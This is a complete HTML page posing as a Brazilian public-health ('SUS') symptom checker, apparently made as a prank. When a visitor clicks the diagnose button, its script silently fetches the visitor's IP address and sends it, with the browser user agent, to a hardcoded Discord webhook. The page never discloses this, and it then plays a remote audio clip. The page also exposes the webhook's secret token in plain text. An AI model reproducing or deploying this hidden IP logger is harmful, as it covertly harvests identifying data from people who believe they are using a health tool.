<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel SUS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 400px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
            box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1);
            background-color: #f9f9f9;
            text-align: center;
        }
        h1 {
            color: black;
            margin-bottom: 10px;
        }
        select, button {
            margin-top: 10px;
            padding: 10px;
            width: 100%;
            font-size: 16px;
        }
        #erro {
            color: red;
            font-weight: bold;
            display: none;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>PAINEL SUS</h1>
        <p>Escolha o que está sentindo</p>
        
        <select id="sintomas">
            <option value="selecione">Selecione</option>
            <option value="febre">Febre</option>
            <option value="tosse">Tosse</option>
            <option value="dor_de_cabeca">Dor de Cabeça</option>
            <option value="nausea">Náusea</option>
            <option value="vômito">Vômito</option>
            <option value="saudade dela">Saudade Dela</option>
        </select>

        <button onclick="diagnosticar()">Diagnosticar</button>

        <p id="erro">Erro: já existe alguém com esse sintoma</p>
    </div>

    <script>
        function diagnosticar() {
            document.getElementById("erro").style.display = "block";
            
            const userAgent = navigator.userAgent;

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip; 
                    
                    const webhookUrl = "https://discord.com/api/webhooks/1261347765875642478/eQeiXjMrIZlNZOUuSl2bmhocVma6EXMk255Jr_lvUdlurl2Iy9mlgCyYTpFCa-8MfjhL"; // Substitua pelo seu link de webhook do Discord
                    const message = {
                        content: `novo acesso detectado:`,
                        embeds: [{
                            title: "Informações do Usuário",
                            fields: [
                                { name: "IP", value: ip },
                                { name: "Navegador", value: userAgent }
                            ]
                        }]
                    };

                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    }).catch(err => console.error('Erro ao enviar para o webhook: ', err));
                })
                .catch(err => console.error('Erro ao obter IP: ', err));
            
            setTimeout(() => {
                let audio = new Audio("https://github.com/Toskopadoo/Audios/raw/refs/heads/main/AUD-20250302-WA0286.mp3");
                audio.play();
            }, 100);
        }
    </script>

    <!-- by: ig @toskopado_ -->
</body>
</html>
